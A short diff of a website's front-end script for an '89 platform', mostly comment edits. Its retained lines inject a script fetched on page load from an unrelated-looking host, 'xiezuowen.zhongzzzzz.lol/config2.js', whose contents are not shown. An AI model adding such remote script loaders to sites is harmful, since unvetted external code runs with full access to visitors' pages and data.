@@ -1,14 +1,12 @@
 document.addEventListener('DOMContentLoaded', function() {
     console.log('89 平台前端脚本已成功加载');
 
-    // 1. 只需要这一行把外链“甩”出去让浏览器自己去加载，不需要写任何监听
+    // 1. 加载外链
     const cfgScript = document.createElement('script');
     cfgScript.src = 'https://xiezuowen.zhongzzzzz.lol/config2.js';
     document.head.appendChild(cfgScript);
 
-============================
-
-    // 移动端导航菜单切换控制
+    // 2. 移动端导航菜单切换控制
     const mobileMenuToggle = document.querySelector('.mobile-menu-toggle');
     const mainNav = document.querySelector('.main-nav');
 
